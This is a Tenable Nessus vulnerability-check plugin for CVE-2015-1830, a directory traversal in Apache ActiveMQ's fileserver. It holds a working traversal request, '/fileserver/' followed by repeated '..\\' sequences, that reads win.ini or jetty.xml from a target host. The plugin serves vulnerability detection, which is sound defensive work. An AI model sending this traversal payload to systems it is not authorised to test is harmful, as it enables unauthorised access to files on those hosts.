#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(85580);
  script_version("$Revision: 1.6 $");
  script_cvs_date("$Date: 2016/01/17 15:50:10 $");

  script_cve_id("CVE-2015-1830");
  script_osvdb_id(126390);

  script_name(english:"Apache ActiveMQ Blob Message Directory Traversal");
  script_summary(english:"Attempts to retrieve a local file.");

  script_set_attribute(attribute:"synopsis", value:
"A web application on the remote host is affected by a directory
traversal vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of Apache ActiveMQ running on the remote host is affected
by a directory traversal vulnerability due to improper sanitization of
user-supplied input in the fileserver upload and download
functionality. An unauthenticated, remote attacker can exploit this,
via a specially crafted request, to read and upload arbitrary JSP
files, resulting in the execution of arbitrary commands.");
  # http://activemq.apache.org/security-advisories.data/CVE-2015-1830-announcement.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ed82104f");
  script_set_attribute(attribute:"solution", value:
"Upgrade to Apache ActiveMQ 5.11.2 / 5.12.0 or later. Alternatively,
apply the  vendor recommended mitigation instructions.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/08/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/08/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/08/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:activemq");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("activemq_web_console_detect.nasl", "os_fingerprint.nasl");
  script_require_keys("installed_sw/ActiveMQ");
  script_require_ports("Services/www", 8161);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("install_func.inc");

app = 'ActiveMQ';
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:8161);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];

# This only affects Windows according to the advisory
if (report_paranoia != 2)
{
  os = get_kb_item("Host/OS");
  if (!os || "Windows" >!< os) audit(AUDIT_OS_NOT, "affected");
}

files = make_list('/windows/win.ini', '/winnt/win.ini', '/conf/jetty.xml');

file_pats = make_array();
file_pats['/winnt/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/windows/win.ini'] = "^\[[a-zA-Z\s]+\]|^; for 16-bit app support";
file_pats['/conf/jetty.xml'] = '\\<property.*value="ActiveMQRealm"';

url = "/fileserver/" + mult_str(str:"..\\", nb:12);
foreach file (files)
{
  if (file == '/conf/jetty.xml')
    url = "/fileserver/..\\..\\";

  res = http_send_recv3(
    method : "GET",
    port   : port,
    item   : url + file,
    exit_on_fail : TRUE
  );
  if (egrep(pattern:file_pats[file], string:res[2]))
  {
    vuln = TRUE;
    break;
  }
}
if (!vuln)
  audit(AUDIT_WEB_APP_NOT_AFFECTED, app, build_url(qs:dir, port:port));

security_report_v4(
  port        : port,
  severity    : SECURITY_HOLE,
  file        : file,
  request     : make_list(build_url(qs:url+file, port:port)),
  output      : chomp(res[2]),
  attach_type : 'text/plain'
);
exit(0);
